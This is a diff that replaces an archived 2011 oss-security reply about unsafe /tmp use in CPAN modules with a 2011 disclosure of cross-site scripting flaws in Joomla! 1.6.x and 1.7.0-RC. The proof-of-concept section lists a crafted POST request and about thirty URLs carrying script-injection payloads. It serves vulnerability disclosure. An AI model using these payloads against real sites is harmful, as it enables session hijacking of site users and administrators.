@@ -1,82 +1,187 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/04/8
-Message-ID: <4EB42B96.5080506@nixnuts.net>
-Date: Fri, 04 Nov 2011 13:14:46 -0500
-From: John Lightsey <john@...nuts.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/07/22/1
+Message-ID: <CAPYM6VyXTvGtPU7qe6YaY4WAQ4DHSfScmi4ATiWR4DaQmZsXng@mail.gmail.com>
+Date: Fri, 22 Jul 2011 11:34:25 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: unsafe use of /tmp in multiple CPAN modules
+Subject: CVE Request: Joomla! 1.7.0-RC and lower | Cross Site Scripting Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+=================================================================================
+ Joomla! 1.7.0-RC and lower | Multiple Cross Site Scripting (XSS)
+Vulnerabilities
+=================================================================================
 
-On 11/04/2011 11:36 AM, Solar Designer wrote:
-> On Fri, Nov 04, 2011 at 09:46:45AM -0500, John Lightsey wrote:
->> PAR::Packer - PAR packed files are extracted to unsafe and predictable
->> temporary directories
->>
->> https://rt.cpan.org/Public/Bug/Display.html?id=69560
-> 
-> I think that your description for this one happens to encourage a poor
-> fix for it.  Specifically, starting the description by "par_mktmpdir()
-> makes no effort to verify that the /tmp/par-<username> directory is safe
-> to use" may result in this function being patched to do such checks,
-> which I think would be a poor fix.  A better fix would be to properly
-> create a temporary files directory, with a less predictable name and
-> with due retries (with new names) if the directory already exists -
-> preferably using File::Temp's tempdir().
-> 
 
-The problem with using random directory names here is that the
-/tmp/par-user directory is being used as a caching mechanism to avoid
-extracting the PAR contents over and over. A better alternative may be
-to use $ENV{'HOME'}/.par or something along those lines.
+1. OVERVIEW
 
->> File::Temp - _is_safe() allows unsafe traversal of symlinks
->>
->> https://rt.cpan.org/Public/Bug/Display.html?id=69106
-> 
+Joomla! 1.7.0-RC and versions of 1.6.x are vulnerable to multiple
+Cross Site Scripting issues.
 
-> As to the proposed fix (symlink-safety.patch), it partially helps in
-> certain special misuse cases.  Namely, when the pathname is not
-> untrusted/malicious, but is poorly chosen, yet it contains just one
-> unsafe component.  However, even in that case this fix doesn't protect
-> from hard-linking of an existing suitable symlink (of a trusted user)
-> into /tmp (possibly under a different name, although the symlink target
-> name remains that of the original symlink).  And the limitation of
-> working for just one unsafe path component is no good; perhaps HIGH's
-> checks of parent directories would be better enabled unconditionally,
-> and even then this stuff is highly questionable.
 
-I'm not sure I follow how that would work as an attack vector. If I
-hardlink a symlink of another user into /tmp, I can't easily remove the
-symlink afterwards to point it somewhere else. If _is_safe() checks the
-ownership of the symlink and the ownership of the symlink target it
-would be very difficult to misuse a symlink in this fashion.
+2. BACKGROUND
 
-I would definitely agree that using File::Temp is preferable to someone
-implementing custom /tmp handling logic. Most of the CPAN code that
-messes with /tmp directly should be using File::Temp instead.
+Joomla is a free and open source content management system (CMS) for
+publishing content on the World Wide Web and intranets. It comprises a
+model–view–controller (MVC) Web application framework that can also be
+used independently.
+Joomla is written in PHP, uses object-oriented programming (OOP)
+techniques and software design patterns, stores data in a MySQL
+database, and includes features such as page caching, RSS feeds,
+printable versions of pages, news flashes, blogs, polls, search, and
+support for language internationalization.
 
-I've not seen any code on CPAN uses File::Temp to create nested
-subdirectories in the fashion that would be required for an unsafe
-intermediate symlink to be a problem. IE: /tmp/foo/barXXXXX with
-/tmp/foo being the unsafe symlink.
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.10 (GNU/Linux)
-Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
 
-iQIcBAEBAgAGBQJOtCuUAAoJEORPgBbTYw+JLNIP/2XGGZX2fsnjf1TSREmAHZOa
-b7p8W/4MHR05EgY+Zp9eMv/sEx22CmeptCHfNtBhNpxWVmQ4yuvamk9mazaUTCqD
-2iGjsftKRXn3OxLRg5RduiWBJD/4Jwm7XUfUy3E8P566JagxevxduVu7kYNVWGrJ
-I1lb8xoLM9NcgGVzlK9G5pk1rQr50vSXJLF/H9sk7dtKv0FToJgJJBbixJDNdhBD
-EsUowkoIDcOejDZLnT5XCdwJSk6RO2wNGry81gfvMirasPtEj1L4TDv6sauB6MEE
-yKr09EVpUwdM+DnGDj4fHWdTHESQFMIXjUNMmgcmzOupIKyrNxeS2CWU1RYImzaE
-lSmehWFVR4acpjHChXVDnKW8fhA3nypYkk1i4QjpaMecHarHMckU0ZzXwsLZQ8P3
-GKd07BRvqZSZZS0crjv+o9lqa6v/itsn+Fplf47s9CGHdVKlVQeKta5yXywRa3yL
-RnNLkoVmCyVphO6Wt5Dt1YKnteHoZb4d6kWlTNGGfbdY5Ymm/L+ZnJQsrc6RNPSL
-Kx7DDWoxfAe2CLFW/kaxIuXsMf3jalNVd43JvudCAwuxKBJJPTeu7CZPN/nkuK3y
-iZUSXMW++yX6OsEqdESBYYPQKjSqjX8ufpJKWybdFSthFF2b69rr3E2DpowVo0k8
-GYiMgjNKCRwbXfJmPJAr
-=gUmO
------END PGP SIGNATURE-----
+3. VULNERABILITY DESCRIPTION
+
+Several parameters (searchword, Request URI) in Joomla! Core
+components are not properly sanitized upon submission to the
+/index.php url, which allows attacker to conduct Cross Site Scripting
+attack. This may allow an attacker to create a specially crafted URL
+that would execute arbitrary script code in a victim's browser.
+
+
+4. VERSION AFFECTED
+
+1.7.0-RC and all versions of 1.6.x
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+component: com_search, parameter: searchword (Browser: IE, Konqueror)
+=====================================================================
+N.B. Our previous reported issue (1.6.3) of "searchword" parameter XSS
+was not fixed completely.
+
+
+[REQUEST]
+POST /joomla164_noseo/index.php HTTP/1.1
+Host: localhost
+Accept: */*
+Accept-Language: en
+User-Agent: MSIE 8.0
+Connection: close
+Referer: http://localhost/joomla164_noseo/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 456
+
+
+task=search&Itemid=435&searchword=Search';onunload=function(){x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,111,32,116,111,32,73,110,98,111,120,63));alert(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,88,83,83,33));};//xsssssssssss&option=com_search
+[/REQUEST]
+
+
+XSS in Request URI
+====================
+File: ./includes/application.php
+Line: 176, 181
+Code: 	$document->setBase(JURI::current());  // instead of
+$document->setBase(htmlspecialchars(JURI::current()));
+
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/new-feed-categories/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-category-list/24-joomla'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/search-component/search/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/site-map/contacts/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/component/banners/click/3'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/fruit-encyclopedia/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/fruit-encyclopedia/38-a'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/fruit-encyclopedia/39-b'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/fruit-encyclopedia/57-t'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/growers/23-happy-orange-orchard'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/image-gallery/animals/25-koala'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/image-gallery/scenery/64-blue-mountain-rain-forest'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/image-gallery/scenery/65-ormiston-pound'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/34-park-site/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/34-park-site/2-webmaster'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/35-shop-site/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/35-shop-site/8-shop-address'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/archived-articles/9-uncategorised'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/archived-articles/9-uncategorised/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/archived-articles/9-uncategorised/67-whats-new-in-15'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-categories/26-park-site'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-categories/29-fruit-shop-site'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-category-list/20-extensions'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-category-list/24-joomla'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/1-joomla-announcements'"><script>alert(/XSS/)</script>
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/2-new-joomla-extensions'"><script>alert(/XSS/)</script>
+
+
+http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/3-joomla-security-news'"><script>alert(/XSS/)</script>
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+6. IMPACT
+
+Attackers can compromise currently logged-in user/administrator
+session and impersonate arbitrary user actions available under
+/administrator/ functions.
+
+
+7. SOLUTION
+
+The development of Joomla! 1.6.x has been ceased; there will be no
+fixed version for 1.6.x.
+Upgrade to Joomla! 1.7.0-stable or higher.
+
+
+8. VENDOR
+
+Joomla! Developer Team
+http://www.joomla.org
+
+
+9. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+10. DISCLOSURE TIME-LINE
+
+2011-07-02: notified vendor
+2011-07-19: patched version, 1.7.0-stable, released
+2011-07-22: vulnerability disclosed
+
+
+11. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.7.0-rc]_cross_site_scripting(XSS)
+Previous Advisory URL:
+http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
+http://yehg.net/lab/#advisories.joomla
+Vendor Advisory URL:
+http://developer.joomla.org/security/news/357-20110701-xss-vulnerability.html
+
+#yehg [2011-07-22]
